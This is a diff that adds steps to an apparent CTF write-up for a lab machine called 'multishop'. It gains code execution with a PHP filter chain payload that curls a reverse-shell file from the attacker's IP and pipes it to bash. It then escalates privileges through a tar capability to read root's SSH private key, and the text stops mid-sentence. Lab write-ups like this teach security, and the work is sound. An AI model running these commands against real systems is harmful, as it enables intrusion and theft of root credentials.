@@ -77,4 +77,33 @@ later the payload will come out and paste it in the parameter name, if you want 
 And it does, we can continue to rce, but we have to create a file and live python3 -m http.server, the steps are as follows:
 1.	Create a file with the name l (fiel that contains revshel bash) why is the name l and does not contain extensions? because so that the payload is not too long, because it is usually an error, the length of url
  ![alt text](/assets/images/hacktrace/multishop/image8.png)
+2.	After that, start the server with python3 -m http.server 80
+ ![alt text](/assets/images/hacktrace/multishop/image9.png)
+3.	Turn on nc to capture the payload we created in the file earlier nc -lvnp port
+4.	Generate payload : python3 php_filter_chain.py --chain  '<?=`curl -s -L 10.18.200.165/l|bash`?>' (meaning that after successfully getting files from our machine server, it is immediately run)
+  ![alt text](/assets/images/hacktrace/multishop/image10.png)
+  ![alt text](/assets/images/hacktrace/multishop/image11.png)
+Now the payload is successful, because the file can be obtained by the target server and immediately executed
+5.	Successful, we have entered the server as www-data
+  ![alt text](/assets/images/hacktrace/multishop/image12.png)
+### Privilage Escalation ###
+1.	Grab linpeas.sh from our machine and move it to the target machine with wget then run linpeas.sh 
+2.	After running it successfully found Files with capabilities (limited to 50)
+  ![alt text](/assets/images/hacktrace/multishop/image13.png)
+  We can manipulate this to get root privileges. There is a capability reference for privsec.: 
+  `https://juggernaut-sec.com/capabilities/`
+3.	We use the /usr/bin/tar to get access rights, try to find id_rsa for ssh login as root.
+4.	We move to the bin directory with the command: cd /usr/bin.
+5.	then tar xf “/root/.ssh/id_rsa” -I '/bin/sh -c “cat 1>&2”' then the id_rsa output will come out.
+  ![alt text](/assets/images/hacktrace/multishop/image14.png)
+6.	managed to get the credential id_rsa to login to ssh as root without using a password, but we can also see the root password (/etc/shadow) by using this credential capability, but it takes time to decrypt the password and we also don't know what wordlist is used. This is 
+
+
+
+
+
+
+
+
+
 
